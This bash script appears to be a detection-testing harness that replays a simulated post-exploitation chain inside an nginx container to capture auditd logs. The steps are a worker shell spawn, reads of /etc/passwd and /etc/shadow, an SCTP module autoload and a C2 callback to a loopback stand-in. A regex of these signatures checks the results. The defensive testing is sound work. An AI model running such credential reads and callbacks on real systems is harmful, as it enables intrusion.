#!/bin/bash
# SBOB-EXAMPLES DEMO WATERMARK — scenario D harness: run the benign and
# post-RCE flows against the nginx fixture and capture the auditd windows.
# Demo reconstruction, loopback-only stand-ins (TDS §4). Grounding:
# NGINX2Root (CVE-2026-123007 et al., Xint 2026-11-18) + kernel SCTP LPE.
#
# Runs INSIDE the workload container (docker exec). The CI lane loads the
# SBoB-generated audit fragment (wazuh/audit/sbob/nginx-worker.rules) before
# invoking this script. The post-RCE worker activity is executed FOR REAL as
# the nginx worker uid (101) via setpriv — the RCE entry vector itself is not
# simulated (SBoB makes no claim about the exploit).
#
# Flow (same discipline as scenarios B/C):
#   warm-up      one benign request OUTSIDE any capture window
#   benign  win  / and /upstream — declared behavior only (silent)
#   drift   win  the post-RCE chain: worker shell spawn, recon reads, SCTP
#                socket (module autoload), C2 callback
#   capture      capture-window.sh filters the audit log into corpus-shaped
#                windows (node-scoped signature keys attributed to uid 0 =
#                host; the SCTP autoload runs modprobe as root)
#   pre-checks   fail loudly before any replay: side effects prove the
#                behaviors executed (the exe-scoped keys cannot tag a
#                containerized worker observed node-side — the scenario-D
#                delta-7 analog); benign must stay drift-free.
set -euo pipefail

AUDIT_LOG="${AUDIT_LOG:-/var/log/audit/audit.log}"
OUT="${TELEMETRY_OUT:-/opt/telemetry}"
mkdir -p "$OUT"

WORKER_UID=101   # the nginx worker user in the official image

req() { curl -s --max-time 20 "http://127.0.0.1:80$1" 2>/dev/null; }

rm -f /var/tmp/.pwned /tmp/c2-standin.log

echo "[harness] warm-up request (outside all windows)"
req / >/dev/null
req /upstream >/dev/null

echo "[harness] benign window"
B0=$(date +%s.%N)
BENIGN_RESP="$(req /; req /upstream)" || BENIGN_RESP="___http-request-failed"
B1=$(date +%s.%N)
printf '%s\n' "$BENIGN_RESP" | head -4

echo "[harness] drift window (post-RCE chain, executed as worker uid $WORKER_UID)"
D0=$(date +%s.%N)
# b1: worker shell spawn — what the RCE'd worker does first
setpriv --reuid $WORKER_UID --regid $WORKER_UID --clear-groups \
  /bin/sh -c 'id > /var/tmp/.pwned' 2>/dev/null || echo "[harness] b1 spawn rc=$?"
# b2: recon reads outside the declared read paths (/etc/passwd, /etc/shadow)
setpriv --reuid $WORKER_UID --regid $WORKER_UID --clear-groups \
  /bin/sh -c 'cat /etc/passwd >/dev/null; head -1 /etc/shadow >/dev/null' 2>/dev/null || echo "[harness] b2 recon rc=$?"
# b3: SCTP socket — the first SCTP open autoloads the sctp kernel module
#     (host-scope module-load signature; the exploit work itself is inside
#     the kernel and invisible to userspace audit — recorded finding)
setpriv --reuid $WORKER_UID --regid $WORKER_UID --clear-groups \
  python3 -c 'import socket; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM, 132); print("[harness] b3 sctp socket fd:", s.fileno()); s.close()' 2>&1 || echo "[harness] b3 sctp socket rc=$?"
# b5: C2 callback to the loopback stand-in (never the real C2)
setpriv --reuid $WORKER_UID --regid $WORKER_UID --clear-groups \
  python3 -c 'import socket; s=socket.create_connection(("127.0.0.1",4446),3); s.sendall(b"GET / HTTP/1.0\r\nHost: c2-standin\r\n\r\n"); print("[harness] b5 c2 connected"); s.close()' 2>&1 || echo "[harness] b5 c2 rc=$?"
D1=$(date +%s.%N)

sleep 10   # let auditd flush the window tail before reading the log back

echo "[harness] audit log view: $(wc -l < "$AUDIT_LOG") lines"
echo "[harness] drift window bounds: [$D0, $D1] (benign: [$B0, $B1])"
bash /opt/harness/capture-window.sh "$AUDIT_LOG" "$B0" "$B1" "$OUT/benign.audit" "$D0" "$D1" "$OUT/drift.audit"

echo "[harness] --- side effects (behaviors really executed) ---"
ls -la /var/tmp/.pwned 2>&1 || true
echo "[harness] C2 stand-in received: $(head -1 /tmp/c2-standin.log 2>/dev/null || echo '(nothing)')"
fail=0

test -s /var/tmp/.pwned \
  || { echo "FAIL: b1 worker shell spawn did not execute (no /var/tmp/.pwned)"; fail=1; }
grep -q 'GET / HTTP/1.0' /tmp/c2-standin.log 2>/dev/null \
  || { echo "FAIL: b5 C2 stand-in listener logged no callback"; fail=1; }

# safety assertion (TDS §4): every SOCKADDR in BOTH windows must be the
# declared upstream or loopback — no other destination, ever
for f in "$OUT/benign.audit" "$OUT/drift.audit"; do
  bad=$(grep -o 'saddr=[0-9A-F]*' "$f" | grep -v -E 'saddr=02001F900A606428|saddr=0200115E7F000001' || true)
  [ -n "$bad" ] && { echo "FAIL: non-stand-in socket address in $f: $bad"; fail=1; }
done

# benign purity
sig_drift_re='exe="/bin/sh"|/etc/passwd|/etc/shadow|/var/tmp/|saddr=0200115E7F000001'
if grep -Eq "$sig_drift_re" "$OUT/benign.audit"; then
  echo "FAIL: benign window contains drift signatures:"; grep -E "$sig_drift_re" "$OUT/benign.audit"; fail=1
fi
if [ -s "$OUT/benign.audit" ]; then
  grep -q 'saddr=02001F900A606428' "$OUT/benign.audit" \
    || { echo "FAIL: benign window has records but no declared upstream connect 10.96.100.40:8080"; fail=1; }
else
  echo "[harness] benign window empty (expected node-side shape — scenario-D delta-7 analog, drift-free by construction)"
fi

if [ "$fail" -ne 0 ]; then
  echo "[harness] benign window:"; cat "$OUT/benign.audit"
  echo "[harness] drift window:"; cat "$OUT/drift.audit"
  echo "FAIL: capture pre-checks failed"; exit 1
fi
echo "[harness] benign window:"; cat "$OUT/benign.audit"
echo "[harness] drift window:"; cat "$OUT/drift.audit"
echo "PASS: capture pre-checks (b1/b5 side effects present, benign drift-free, loopback-only)"
